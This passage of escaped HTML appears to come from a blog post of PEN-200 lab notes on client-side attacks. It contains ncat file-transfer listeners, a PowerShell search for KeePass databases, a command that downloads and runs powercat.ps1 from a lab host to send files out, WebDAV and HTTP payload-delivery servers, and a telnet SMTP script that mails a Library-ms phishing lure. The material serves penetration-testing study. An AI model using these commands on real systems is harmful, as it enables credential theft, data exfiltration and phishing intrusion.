+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/client-side]
+└─$ nc -nvlp 4444 &amp;gt; outfile.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h6&gt;Transfer a file, receiver listens &lt;em&gt;(Windows A.1)&lt;/em&gt;&lt;/h6&gt;
+&lt;pre&gt;&lt;code&gt;host2$ ncat -l &amp;gt; outputfile
+host1$ ncat --send-only host2 &amp;lt; inputfile
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h6&gt;Send a File Transfer&lt;/h6&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/client-side]
+└─$ ncat 192.168.212.196 4445 &amp;lt; mymacro.doc
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h6&gt;Transfer a file, sender listens&lt;/h6&gt;
+&lt;pre&gt;&lt;code&gt;host1$ ncat -l --send-only &amp;lt; inputfile
+host2$ ncat host1 &amp;gt; outputfile
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;Windows&lt;/h5&gt;
+&lt;h6&gt;Powershell File Search&lt;/h6&gt;
+&lt;pre&gt;&lt;code&gt;Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\jason&amp;gt; Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+
+    Directory: C:\Users\jason\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         5/30/2022  10:33 AM           1982 Database.kdbx
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;User PowerShell.&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem&quot;&gt;Get-ChildItem&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Search the whole drive with &lt;code&gt;-Path C:\&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Specify file type with &lt;code&gt;-Include&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Get a list of files and sub dirs with &lt;code&gt;-File&lt;/code&gt; and &lt;code&gt;-Recurse&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Silence errors and cont exec with &lt;code&gt;-ErrorAction&lt;/code&gt; set to &lt;code&gt;SilentlyContinue&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h6&gt;MD5 Sum in PowerShell&lt;/h6&gt;
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Users\offsec&amp;gt; Get-FileHash .\Desktop\file.txt -Algorithm MD5
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h6&gt;Network file transfer to Ncat listener with powercat.ps1 loaded via network &lt;em&gt;(Linux A.1)&lt;/em&gt;&lt;/h6&gt;
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Users\offsec&amp;gt; IEX(New-Object System.Net.WebClient).DownloadString(&amp;#39;http://192.168.45.223/powercat.ps1&amp;#39;);powercat -c 192.168.45.223 -p 4444 -i .\Desktop\infile.txt -v
+
+PS C:\Users\offsec&amp;gt; IEX(New-Object System.Net.WebClient).DownloadString(&amp;#39;http://192.168.45.223/powercat.ps1&amp;#39;);powercat -l -p 4444 -of C:\file.txt -v
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr&gt;
+&lt;h4&gt;Delivery Mechanisms&lt;/h4&gt;
+&lt;h5&gt;Linux&lt;/h5&gt;
+&lt;h6&gt;WebDAV&lt;/h6&gt;
+&lt;p&gt;Install &lt;code&gt;wsgidav&lt;/code&gt; from &lt;code&gt;apt&lt;/code&gt; or &lt;code&gt;pip&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/]
+└─$ wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r ~/webdav
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h6&gt;HTTP&lt;/h6&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/]
+└─$ python -m http.server -d path/to/serve 8080 
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr&gt;
+&lt;h4&gt;Appendix&lt;/h4&gt;
+&lt;h5&gt;Appendix A.1&lt;/h5&gt;
+&lt;h6&gt;CLI Telnet SMTP Mail Client with Attachment&lt;/h6&gt;
+&lt;pre&gt;&lt;code&gt;#!/bin/bash
+
+# User input to compose email
+read -p &amp;quot;[*] Enter target mail server URL or IP: &amp;quot; SERVER
+read -p &amp;quot;[*] Enter submission port #: &amp;quot; PORT
+read -p &amp;quot;[*] Enter sender mail server URL: &amp;quot; ORIGIN
+read -p &amp;quot;[*] Enter email address for auth: &amp;quot; SENDER
+read -p &amp;quot;[*] Enter password for auth: &amp;quot; PASSWD
+read -p &amp;quot;[*] Enter recipient email address: &amp;quot; RECIPIENT
+read -p &amp;quot;[*] Enter message subject: &amp;quot; SUBJECT
+read -p &amp;quot;[*] Enter message body: &amp;quot; BODY
+read -p &amp;quot;[*] Path to attachment (Enter if none)?: &amp;quot; FILE
+
+# Base64 encode username, password, and file attachment (if any)
+ENCU=$(printf &amp;quot;$SENDER&amp;quot; | base64);
+ENCP=$(printf &amp;quot;$PASSWD&amp;quot; | base64);
+
+# Check vars
+sleep 0.5;
+echo &amp;quot;[$] Preparing email...&amp;quot;
+echo &amp;quot;[+] Target mail server: $SERVER&amp;quot;
+echo &amp;quot;[+] Port: $PORT&amp;quot;
+echo &amp;quot;[+] Sending mail server: $ORIGIN&amp;quot;
+echo &amp;quot;[+] Sender: $SENDER&amp;quot;
+echo &amp;quot;[+] Passwd: $PASSWD&amp;quot;
+echo &amp;quot;[+] Base64 Username: $ENCU&amp;quot;
+echo &amp;quot;[+] Base64 Password: $ENCP&amp;quot;
+echo &amp;quot;[+] Recipient: $RECIPIENT&amp;quot;
+echo &amp;quot;[+] Subject: $SUBJECT&amp;quot;
+echo &amp;quot;[+] Body: $BODY&amp;quot;
+if [ ! -z &amp;quot;$FILE&amp;quot; ]
+then
+    echo &amp;quot;[+] File attachment: $FILE&amp;quot;
+    echo &amp;quot;[+] Base64 file string: $ENCF&amp;quot;
+fi
+
+# Telnet session
+{
+sleep 2;
+echo &amp;quot;EHLO $ORIGIN&amp;quot;
+sleep 2;
+echo &amp;quot;AUTH LOGIN&amp;quot;
+sleep 2;
+echo &amp;quot;$ENCU&amp;quot;
+sleep 2;
+echo &amp;quot;$ENCP&amp;quot;
+sleep 2;
+echo &amp;quot;MAIL FROM: $SENDER&amp;quot;
+sleep 2;
+echo &amp;quot;RCPT TO: $RECIPIENT&amp;quot;
+sleep 2;
+echo &amp;quot;DATA&amp;quot;
+sleep 2;
+echo &amp;quot;Subject: $SUBJECT&amp;quot;
+sleep 2;
+if [ ! -z &amp;quot;$FILE&amp;quot; ]
+then
+    echo &amp;quot;Content-Type: multipart/mixed; boundary=&amp;quot;x-=-segment sep&amp;quot;&amp;quot;
+    sleep 2;
+    echo &amp;quot;&amp;quot;
+    sleep 2;
+    echo &amp;quot;This is a MIME formatted message.  If you see this text it means that your&amp;quot;
+    sleep 2;
+    echo &amp;quot;email software does not support MIME formatted messages.&amp;quot;
+    sleep 2;
+    echo &amp;quot;--x-=-segment sep&amp;quot;
+    sleep 2;
+    echo &amp;quot;Content-Type: text/plain; charset=UTF-8; format=flowed&amp;quot;
+    sleep 2;
+    echo &amp;quot;Content-Disposition: inline&amp;quot;
+    sleep 2;
+fi
+echo &amp;quot;&amp;quot;
+sleep 2;
+echo $BODY
+sleep 2;
+echo &amp;quot;&amp;quot;
+sleep 2;
+if [ ! -z &amp;quot;$FILE&amp;quot; ]
+then
+    echo &amp;quot;--x-=-segment sep&amp;quot;
+    sleep 2;
+    echo &amp;quot;Content-Type: file --mime-type -b $FILE; name=$FILE&amp;quot;
+    sleep 2;
+    echo &amp;quot;Content-Transfer-Encoding: base64&amp;quot;
+    sleep 2;
+    echo &amp;quot;Content-Disposition: attachment; filename=&amp;quot;$FILE&amp;quot;;&amp;quot;
+    sleep 2;
+    echo &amp;quot;&amp;quot;
+    sleep 2;
+    for SEG in $(base64 $FILE)
+    do
+        echo &amp;quot;$SEG&amp;quot;
+    done
+    sleep 2;
+    echo &amp;quot;&amp;quot;
+    sleep 2;
+    echo &amp;quot;--x-=-segment sep--&amp;quot;
+    sleep 2;
+fi
+echo &amp;quot;.&amp;quot;
+sleep 2;
+echo &amp;quot;QUIT&amp;quot;
+sleep 4;
+} | telnet $SERVER $PORT
+
+echo &amp;quot;[-] Exit with status: $?&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h6&gt;Example of Library-ms sent via Win Mail Client&lt;/h6&gt;
+&lt;pre&gt;&lt;code&gt;Return-Path: test@supermagicorg.com
+Received: from smtp.supermagicorg.com (Unknown [192.168.45.223])
+    by ADMIN with ESMTPA
+    ; Sat, 9 Sep 2023 15:08:54 -0700
+Message-ID: &amp;lt;61727A3C-5FAC-4DDC-8590-7199969083FC@ADMIN&amp;gt;
+
+Subject: Test email
+
+Content-Type: multipart/mixed; boundary=----------5bXWLJjHEcPk2U7KNqSl
+
+This is a MIME formatted message.  If you see this text it means that your
+email software does not support MIME formatted messages.
+
+----------5bXWLJjHEcPk2U7KNqSl
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Disposition: inline
+
+test 1, 2, 3
+
+
+----------5bXWLJjHEcPk2U7KNqSl
+Content-Type: file --mime-type -b config.Library-ms; name=config.Library-ms
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=config.Library-ms;
+
+PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxsaWJyYXJ5RGVzY3JpcHRp b24geG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZG93cy8yMDA5L2xpYnJh cnkiPg0KPG5hbWU+QHdpbmRvd3Muc3RvcmFnZS5kbGwsLTM0NTgyPC9uYW1lPg0KPHZlcnNpb24+ NjwvdmVyc2lvbj4NCjxpc0xpYnJhcnlQaW5uZWQ+dHJ1ZTwvaXNMaWJyYXJ5UGlubmVkPg0KPGlj b25SZWZlcmVuY2U+aW1hZ2VyZXMuZGxsLC0xMDAzPC9pY29uUmVmZXJlbmNlPg0KPHRlbXBsYXRl SW5mbz4NCjxmb2xkZXJUeXBlPns3ZDQ5ZDcyNi0zYzIxLTRmMDUtOTlhYS1mZGMyYzk0NzQ2NTZ9 PC9mb2xkZXJUeXBlPg0KPC90ZW1wbGF0ZUluZm8+DQo8c2VhcmNoQ29ubmVjdG9yRGVzY3JpcHRp b25MaXN0Pg0KPHNlYXJjaENvbm5lY3RvckRlc2NyaXB0aW9uPg0KPGlzRGVmYXVsdFNhdmVMb2Nh dGlvbj50cnVlPC9pc0RlZmF1bHRTYXZlTG9jYXRpb24+DQo8aXNTdXBwb3J0ZWQ+ZmFsc2U8L2lz U3VwcG9ydGVkPg0KPHNpbXBsZUxvY2F0aW9uPg0KPHVybD5odHRwOi8vMTkyLjE2OC40NS4yMjM8 L3VybD4NCjwvc2ltcGxlTG9jYXRpb24+DQo8L3NlYXJjaENvbm5lY3RvckRlc2NyaXB0aW9uPg0K PC9zZWFyY2hDb25uZWN0b3JEZXNjcmlwdGlvbkxpc3Q+DQo8L2xpYnJhcnlEZXNjcmlwdGlvbj4=
+
+
+----------5bXWLJjHEcPk2U7KNqSl
+
+.
+&lt;/code&gt;&lt;/pre&gt;
+
+  &lt;/div&gt;
+
+  
+    &lt;footer class=&quot;blog-author-card&quot;&gt;
+      
+        &lt;img class=&quot;blog-author-avatar&quot; src=&quot;../assets/static/img/bunny-punx.webp&quot; alt=&quot;m4xx3d0ut avatar&quot;&gt;
+      
+      &lt;div class=&quot;blog-author-details&quot;&gt;
+        &lt;strong class=&quot;blog-author-name&quot;&gt;m4xx3d0ut&lt;/strong&gt;
+        
+          &lt;div class=&quot;blog-author-title&quot;&gt;Chaos Operator&lt;/div&gt;
+        
+        
+          &lt;p class=&quot;blog-author-bio&quot;&gt;Architect of the Neon Terminal Core and Professional Technologist.&lt;/p&gt;
+        
+        
+          &lt;ul class=&quot;blog-author-social&quot;&gt;
+            
+              &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/paul-k-a3a18196/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;@m4xx3d0ut&lt;/a&gt;&lt;/li&gt;
+            
+          &lt;/ul&gt;
+        
+      &lt;/div&gt;
+    &lt;/footer&gt;
+  
+
+  
+    &lt;nav class=&quot;blog-article-nav&quot; aria-label=&quot;Post navigation&quot;&gt;
+      &lt;a
+        class=&quot;blog-article-nav-link&quot;
+        data-blog-nav=&quot;previous&quot;
+        
+        href=&quot;../blog/client-side-attacks.html&quot;
+        data-default-href=&quot;../blog/client-side-attacks.html&quot;
+        data-default-fragment=&quot;../blog/fragments/client-side-attacks.html&quot;
+        data-fragment-href=&quot;../blog/fragments/client-side-attacks.html&quot;
+        data-target-slug=&quot;client-side-attacks&quot;
+        data-post-slug=&quot;client-side-attacks&quot;
+      &gt;
+        &lt;span class=&quot;blog-article-nav-meta&quot;&gt;Previous&lt;/span&gt;
+        &lt;span class=&quot;blog-article-nav-title&quot;&gt;PEN-200 Module 11 — Client-Side Tradecraft&lt;/span&gt;
+      &lt;/a&gt;
+      &lt;span class=&quot;blog-article-nav-delimiter&quot; aria-hidden=&quot;true&quot;&gt;&amp;nbsp;•&amp;nbsp;&lt;/span&gt;
+      &lt;a
+        class=&quot;blog-article-nav-link&quot;
+        data-blog-nav=&quot;next&quot;
+        
+        href=&quot;../blog/sql-injection.html&quot;
+        data-default-href=&quot;../blog/sql-injection.html&quot;
+        data-default-fragment=&quot;../blog/fragments/sql-injection.html&quot;
+        data-fragment-href=&quot;../blog/fragments/sql-injection.html&quot;
+        data-target-slug=&quot;sql-injection&quot;
+        data-post-slug=&quot;sql-injection&quot;
+      &gt;
+        &lt;span class=&quot;blog-article-nav-meta&quot;&gt;Next&lt;/span&gt;
+        &lt;span class=&quot;blog-article-nav-title&quot;&gt;PEN-200 Module 10 — SQL Injection Field Notes&lt;/span&gt;
+      &lt;/a&gt;
+    &lt;/nav&gt;
+  
+&lt;/article&gt;
+
+    &lt;/div&gt;
+  &lt;/main&gt;
+
+  &lt;footer&gt;
+    
+      &lt;!-- footer partial (auto-generated) --&gt;
+&lt;div id=&quot;foot&quot;&gt;
+  &lt;p&gt;
+    &lt;center&gt;
+      Warning! Chaosandmajesty.com accepts no responsibility for your interactions with WOPR.
+    &lt;/center&gt;
+  &lt;/p&gt;
+&lt;/div&gt;
+
+    
+    &lt;div class=&quot;container footer-container&quot;&gt;
+      &lt;p class=&quot;footer-copy&quot;&gt;&amp;copy; 2025 Core&lt;/p&gt;
+    &lt;/div&gt;
+  &lt;/footer&gt;
+
+  &lt;button type=&quot;button&quot; class=&quot;blog-back-to-top&quot; aria-label=&quot;Back to top&quot;&gt;
+    ▲
+  &lt;/button&gt;
+
+  &lt;script&gt;
+    document.addEventListener(&#039;DOMContentLoaded&#039;, function() {
+      var toggleBtn = document.querySelector(&#039;.nav-toggle&#039;);
+      var headerEl = document.querySelector(&#039;header&#039;);
+      if (toggleBtn) {
+        toggleBtn.addEventListener(&#039;click&#039;, function() {
+          headerEl.classList.toggle(&#039;nav-open&#039;);
+        });
+      }
+    });
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+      </div>
+    </article>
+  
